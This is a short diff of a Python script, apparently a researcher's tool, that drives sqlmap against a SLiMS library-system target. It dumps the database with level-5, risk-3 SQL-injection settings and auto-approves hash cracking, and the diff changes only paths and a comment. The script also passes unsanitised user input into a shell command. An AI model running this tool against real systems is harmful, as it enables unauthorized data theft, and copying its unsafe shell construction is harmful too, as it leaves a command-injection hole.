@@ -17,10 +17,10 @@ print(Fore.RED)
 User_Agent = input()
 print(Style.RESET_ALL)
 
-# Here you can modify your OWN injection construction!
+# Here, you can modify your OWN injection construction!
 # Your EXPLOIT ENVIRONMENT 
-env = 'C:\\Users\\nu11secur1ty\\Desktop\\slims9_bulian-9.6.1\\SQLi\\G0BurpSQLmaPI\\'
-os.system('python D:\\CVE\\sqlmap-nu11secur1ty\\sqlmap.py -r '+env+'exploit.txt --tamper=space2comment --user-agent='+User_Agent+' --dbms=mysql --time-sec=7 --random-agent --level=5 --risk=3 --batch --answers="crack=Y,dict=Y,continue=Y,quit=N" --dump')
+env = 'Y:\\Path-to-your-GoBMap1\\SQLi\\G0BurpSQLmaPI\\'
+os.system('python Y:\\your-sqlmap-nu11secur1ty-app\\sqlmap-nu11secur1ty\\sqlmap.py -r '+env+'exploit.txt --tamper=space2comment --user-agent='+User_Agent+' --dbms=mysql --time-sec=7 --random-agent --level=5 --risk=3 --batch --answers="crack=Y,dict=Y,continue=Y,quit=N" --dump')
 
 print(Fore.RED +"Happy hunting with nu11secur1ty =)")
 print(Style.RESET_ALL)
